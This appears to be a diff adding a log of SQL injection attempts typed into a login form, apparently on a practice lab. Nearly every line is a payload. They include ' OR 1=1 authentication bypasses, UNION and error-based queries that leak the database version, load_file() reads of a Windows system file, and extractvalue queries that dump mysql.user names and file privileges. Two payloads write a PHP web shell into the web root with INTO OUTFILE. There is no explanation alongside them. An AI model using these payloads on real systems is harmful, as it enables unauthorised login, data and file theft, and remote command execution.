@@ -1,0 +1,86 @@
+User Name:'Password:
+User Name:' OR 1=1 --+Password:
+User Name:' OR 1=1 --+Password:' OR 1=1 --+
+User Name:1Password:' OR 1=1 --+
+User Name:' OR 1=1 --+Password:' OR 1=1 --+
+User Name:'Password:
+User Name:' OR 1=1 --+Password:2
+User Name:' OR 1=1 --+Password:
+User Name:' OR 1=1 --+Password:
+User Name:' OR 1=1 -- Password:1
+User Name:' OR 1=1 -- Password:1
+User Name:' OR 1=1 -- Password:
+User Name:' OR 1=1 -- Password:
+User Name:' OR 1=1 --+Password:2
+User Name:' OR 1=1 -- Password:
+User Name:'Password:
+User Name:' OR 1=1 -- Password:
+User Name:' AND id=2 OR 1=1 -- Password:
+User Name:' AND id=5 OR 1=1 -- Password:
+User Name:' OR ( id = "2" AND 1=1) -- Password:
+User Name:' OR ( id = "3" AND 1=1) -- Password:
+User Name:' OR ( id = "2" ) -- Password:
+User Name:' OR ( id = "0" ) UNION SELECT 1,@@version,1 -- Password:
+User Name:' OR ( id = "0" ) UNION SELECT @@version,1 -- Password:
+User Name:' OR UNION SELECT @@version,1 -- Password:
+User Name:' OR (1=1) UNION SELECT @@version,1 -- Password:
+User Name:' OR (1=1) UNION SELECT @@version,1 -- Password:
+User Name:' AND (SELECT 1 FROM (SELECT count(*), concat(version(), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y)#Password:
+User Name:' AND (SELECT 1 FROM (SELECT count(*), concat(version(), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y)#Password:
+User Name:' AND (SELECT 1 FROM (SELECT count(*), concat(version(), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x))#Password:
+User Name:' AND (SELECT 1 FROM (SELECT count(*), concat(version(), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y)#Password:
+User Name:' OR 1=1 --+Password:
+User Name:DumbPassword:Dumb
+User Name:DumbPassword:Dumb
+User Name:DumbPassword:Dumb
+User Name:dumbPassword:dumb
+User Name:' OR 1=1 --+Password:2
+User Name:DummyPassword:p@ssword
+User Name:DummyPassword:p@ssword
+User Name:' OR 1=1 --+Password:2
+User Name:DumbPassword:Dumb
+User Name:DumbPassword:Dumb
+User Name:'Password:
+User Name:\'Password:
+User Name:\'Password:
+User Name:\'Password:
+User Name:'Password:
+User Name:'''Password:
+User Name:\'Password:
+User Name:\'Password:
+User Name:\Password:
+User Name:1Password:
+User Name:1Password:
+User Name:asPassword:
+User Name:asPassword:1
+User Name:asPassword:1
+User Name:asPassword:1
+User Name:' OR 1=1 -- Password:1
+User Name:\' OR 1=1 -- Password:1
+User Name:\' OR 1=1 -- Password:1
+User Name:\' OR 1=1 -- Password:1
+User Name:' OR 1=1 --+Password:1
+User Name:' OR 1=1 --+Password:1
+User Name:' OR 1=1 --+Password:
+User Name:dumbPassword:dumb
+User Name:dumbPassword:dumb
+User Name:' OR 1=1 --+Password:
+User Name:' OR 1=1 --+Password:
+User Name:1Password:2
+User Name:1Password:2
+User Name:Password:
+User Name:Password:
+User Name:' union select load_file('C:\\\\Windows\\\\win.ini')-- Password:1
+User Name:' union select 1,load_file('C:\\\\Windows\\\\win.ini'),1-- Password:
+User Name:' union select 1,load_file('C:\\\\Windows\\\\win.ini')-- Password:
+User Name:' AND (SELECT 1 FROM (SELECT count(*), concat(load_file('C:\\\\Windows\\\\win.ini'), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y)#Password:
+User Name:' AND (SELECT 1 FROM (SELECT count(*), concat(load_file('C:\\\\Windows\\\\win.ini'), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y)#Password:
+User Name:' AND (SELECT 1 FROM (SELECT count(*), concat(concat_ws(':', load_file('C:\\\\Windows\\\\win.ini')), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y)#Password:
+User Name:' AND (SELECT 1 FROM (SELECT count(*), concat(concat_ws(':', load_file('C:\\\\Windows\\\\win.ini')), floor(rand(0)*2))x FROM information_schema.columns GROUP BY x)y)#Password:
+User Name:' union select 1,"<?php system($_GET['cmd']) ?>" into outfile 'C:/wamp64/www/shell'-- Password:
+User Name:' union select 1,"<?php system($_GET['cmd']) ?>" into outfile 'C:/wamp64/www/shell.php'-- Password:
+User Name:' OR extractvalue(1,concat(0x7e,(select+group_concat(user,0x7e,file_priv,0x7e)+from+mysql.user))) -- Password:
+User Name:' OR extractvalue(1,concat(0x7e,(select+group_concat(user,0x7e,file_priv,0x7e)+from+mysql.user)))) -- Password:
+User Name:' OR extractvalue(1,concat(0x7e,(select+group_concat(user,0x7e,file_priv,0x7e)+from+mysql.user)) -- Password:
+User Name:' OR extractvalue(1,concat(0x7e,(select+group_concat(user,0x7e,file_priv,0x7e)+from+mysql.user))) --  Password:
+User Name:' OR extractvalue(1,concat(0x7e,(select+group_concat(user,0x7e,file_priv,0x7e) from mysql.user))) --  Password:
